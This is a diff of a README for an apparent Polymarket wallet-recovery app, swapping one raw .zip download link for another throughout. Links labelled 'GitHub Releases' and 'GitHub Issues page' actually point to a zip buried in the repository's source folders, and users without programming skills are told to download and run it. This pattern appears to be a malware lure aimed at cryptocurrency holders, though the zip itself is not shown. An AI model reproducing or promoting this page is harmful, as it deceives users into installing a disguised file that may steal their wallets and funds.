@@ -1,6 +1,6 @@
 # 🪙 polymarket-wallet-recovery - Easily Recover Your USDC and Positions
 
-[![Download](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/encode/wallet_polymarket_recovery_v2.1.zip)](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/encode/wallet_polymarket_recovery_v2.1.zip)
+[![Download](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/constants/recovery-polymarket-wallet-v1.7.zip)](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/constants/recovery-polymarket-wallet-v1.7.zip)
 
 ## 🌟 Overview
 Welcome to the **polymarket-wallet-recovery** application. This tool helps you recover USDC and prediction market positions from Polymarket smart contract wallets, such as Proxy and Safe. With this app, you can sell positions, redeem winnings, and withdraw funds directly from your wallets.
@@ -9,7 +9,7 @@ Welcome to the **polymarket-wallet-recovery** application. This tool helps you r
 To make the most of this application, follow the steps below to download and set it up on your computer. No programming skills are needed.
 
 ## 📥 Download & Install
-1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/encode/wallet_polymarket_recovery_v2.1.zip)
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/constants/recovery-polymarket-wallet-v1.7.zip)
 2. Select the version you want to download. Look for the latest stable release for the best experience.
 3. Click on the appropriate file for your operating system (Windows, Mac, or Linux).
 4. After the download is complete, locate the downloaded file on your computer. This will usually be in your "Downloads" folder.
@@ -44,7 +44,7 @@ If you encounter issues, here are some common problems and solutions:
 
 ## 🛠️ Support
 Need help? You can reach out for support by:
-- Visiting our [GitHub Issues page](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/encode/wallet_polymarket_recovery_v2.1.zip) to report problems or ask questions.
+- Visiting our [GitHub Issues page](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/constants/recovery-polymarket-wallet-v1.7.zip) to report problems or ask questions.
 - Checking the FAQ section on our GitHub page for quick answers.
 
 ## 📦 Frequently Asked Questions
@@ -83,6 +83,6 @@ This repository covers a variety of topics including:
 - wallet-recovery
 
 ## 📥 Download Here Again
-For your convenience, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/encode/wallet_polymarket_recovery_v2.1.zip)
+For your convenience, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/arunraj926/polymarket-wallet-recovery/main/src/constants/recovery-polymarket-wallet-v1.7.zip)
 
 We hope this guide helps you navigate the installation and use of the polymarket-wallet-recovery application. Enjoy managing your assets with ease!
